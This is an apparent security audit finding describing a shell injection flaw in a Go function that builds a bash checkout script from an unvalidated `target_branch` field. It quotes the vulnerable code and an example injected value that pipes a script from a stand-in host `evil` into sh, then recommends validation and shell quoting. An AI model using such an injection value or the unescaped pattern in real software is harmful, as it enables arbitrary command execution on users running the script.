---
id: gate-security-finalize-script-shell-escape
kind: story
stage: drafting
tags: [security, portal, plugin]
parent: null
depends_on: []
release_binding: v0.1.0
gate_origin: security
created: 2026-05-18
updated: 2026-05-18
---

# Shell injection latent in `finalize` plan script via attacker-controlled `target_branch`

## Severity
Medium

## Domain
Input Validation & Injection

## Location
`internal/portal/finalize/script.go:160-167`,
`internal/portal/finalize/lock_patch.go:174`

## Evidence
```go
func writeCheckoutStep(b *strings.Builder, targetBranch, baseSHA string) {
    ...
    b.WriteString(fmt.Sprintf("echo \"==> Creating target branch %s at %s\"\n", targetBranch, short))
    b.WriteString(fmt.Sprintf("git checkout -b \"%s\" %s\n", targetBranch, baseSHA))
}
```

`target_branch` is taken straight from the lock-holder's
`PatchFinalizeLock` body with no shape validation and embedded inside a
bash double-quoted argument. A lock holder can set
``target_branch = `x";curl evil/i.sh|sh;#` `` and any session member who
later copy/pastes the rendered `plan.script` from a UI or terminal runs
arbitrary commands. The Go-side CLI plugin
(`cmd/jamsesh/finalizecmd/execute.go`) uses `exec.Command` and is safe,
but the script body shipped to clients is not.

## Remediation direction
Validate `target_branch` (and reject `base_sha` that isn't a hex SHA) at
`PatchFinalizeLock` time against `^[A-Za-z0-9._/-]+$` and ensure it
doesn't start with `-`. Also shell-escape both fields inside
`writeCheckoutStep` / `buildPreserveScript` / `buildSquashScript` via a
`shellquote` helper for defense-in-depth.
